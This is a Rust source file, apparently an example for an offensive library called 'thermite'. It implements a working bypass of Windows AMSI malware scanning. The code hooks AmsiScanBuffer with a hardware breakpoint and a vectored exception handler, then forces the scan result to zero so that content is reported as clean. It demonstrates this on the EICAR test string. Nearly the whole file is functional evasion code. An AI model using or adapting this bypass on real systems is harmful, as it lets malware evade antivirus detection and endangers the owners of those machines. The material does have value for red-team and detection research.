#![allow(nonstandard_style)]


use std::ffi::CString;
use std::mem::transmute;
use std::ptr::null_mut;

use winapi::{
	ctypes::c_void,
	shared::ntdef::HRESULT,
	um::{
		errhandlingapi::AddVectoredExceptionHandler,
		libloaderapi::LoadLibraryA,
		winnt::CONTEXT,
		winnt::CONTEXT_DEBUG_REGISTERS,
		winnt::HANDLE,
	}
};

use thermite::{direct_syscall, error, info};
use thermite::breakpoints::{DebugRegister, get_arguments, rip_to_return_address, set_breakpoint, set_resume_flag, set_ret_value};
use thermite::enumeration::get_thread_id;
use thermite::peb_walk::{get_function_address, get_module_handle};


#[link(name="amsi")]
extern "system" {
	pub fn AmsiInitialize(appName: *const u16, amsiContext: *mut HANDLE) -> HRESULT;
	pub fn AmsiUninitialize(amsiContext: HANDLE);
	pub fn AmsiOpenSession(amsiContext: HANDLE, amsiSession: *mut HANDLE) -> HRESULT;
	pub fn AmsiCloseSession(amsiContext: HANDLE, amsiSession: HANDLE);
	pub fn AmsiScanBuffer(amsiContext: HANDLE, buffer: *const c_void, length: u32, contentName: *const u16, session: HANDLE, result: *mut i32) -> HRESULT;
}


// This function sets up the hardware breakpoint
// It will load AMSI.dll if it is not already loaded, so it can find the address of AmsiScanBuffer
// Then set up a hook with hardware breakpoints at the function's address, so we can hijack the execution
fn setup() -> Result<*mut c_void, String> {
	let amsiscanbuffer_handle: *const u8;

	unsafe {
		let module_name = CString::new("amsi.dll").unwrap();
		let module_handle = get_module_handle("amsi.dll").unwrap_or(LoadLibraryA(module_name.as_ptr()));
		amsiscanbuffer_handle = get_function_address("AmsiScanBuffer", module_handle as _).unwrap();
		if amsiscanbuffer_handle.is_null() { return Err("Failed to get AmsiScanBuffer address".to_string()) };
	}

	let veh = unsafe { AddVectoredExceptionHandler(1, Some(thermite::breakpoints::vectored_handler)) };
	if veh.is_null() { return Err("Failed to add exception handler".to_string()) };
	
	unsafe { set_breakpoint(DebugRegister::DR0, amsiscanbuffer_handle, transmute(callback as fn(_)), get_thread_id()) };

	Ok(veh)
}

// Simple function that calls AmsiScanBuffer on the EICAR test string and display the results
// The EICAR string is a test string used as a test for antiviruses,
// it's pretty much universally recognized as an IOC and should be detected by every half-decent security product
// So if we can get this past AMSI, i think we're good
fn scan_sample(amsi_ctx: *mut c_void, amsi_session: *mut c_void, mut res: HRESULT) -> HRESULT {
	let eicar_string = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
	let name_utf16: Vec<u16> = "TestSession123".encode_utf16().chain(std::iter::once(0)).collect();

	unsafe { AmsiScanBuffer(
		amsi_ctx,
		eicar_string.as_ptr() as *const c_void,
		eicar_string.len() as u32,
		name_utf16.as_ptr(),
		amsi_session,
		&mut res) };
	println!("\t> Scan Result: {res:#x}");
	match res {
		0 => println!("\t> The sample is clean"),
		1 => println!("\t> The sample may be clean"),
		0x4000..=0x4fff => println!("\t> The scan was blocked by an admin"),
		0x8000.. => println!("\t> The sample is definitely malware"),
		_ => println!("\t> ???"),
	}
	res
}


fn callback(ctx: &mut CONTEXT) {
	let result_ptr = get_arguments(ctx, 5) as *mut u32;

	// The last argument of AmsiScanBuffer is a pointer to the results ( &mut results )
	// So we need to derefence it to access its value or to modify it
	unsafe { println!("\t> AMSI really scanned: {:#x}", (*result_ptr)); }
	info!("But let's change it to 0 o/");
	unsafe { *result_ptr = 0; }

	rip_to_return_address(ctx);     // We set the instruction pointer to the return address
	set_ret_value(0, ctx);    // We set the return value to 0 (meaning everything is okay, c.f. AmsiScanBuffer's signature)
	set_resume_flag(ctx)            // We set the resume flag to 1 to allow AmsiScanBuffer to continue executing (but only to return)
}

fn main() {
	// Initializing some stuff for AMSI
	let mut amsi_ctx = null_mut();
	let mut amsi_session = null_mut();
	let res = unsafe { AmsiInitialize("Test Name".encode_utf16().collect::<Vec<u16>>().as_ptr(), &mut amsi_ctx) };
	if res != 0 { error!("Failed to initialize AMSI..."); return; }
	unsafe { AmsiOpenSession(amsi_ctx, &mut amsi_session) };

	// Then we scan a first sample, before the bypass is set
	info!("Scanning the sample...");
	scan_sample(amsi_ctx, amsi_session, res);

	// Set-up the bypass and handle any potential errors
	match setup() {
		Ok(_) => { info!("Successfully set up breakpoint") },
		Err(e) => { error!(e); return; }
	};

	// We scan the sample a second time, this time with the hardware breakpoint set at AmsiScanBuffer's address
	info!("Let's scan the same sample with the bypass active");
	if scan_sample(amsi_ctx, amsi_session, res) == 0 {
		println!("[^o^]/ Hell yeah !");	 // res == 0 means AMSI said the sample was clean :D
	} else {
		error!("oh no");
	}
	
	unsafe {
		AmsiCloseSession(amsi_ctx, amsi_session);
		AmsiUninitialize(amsi_ctx);
	}
}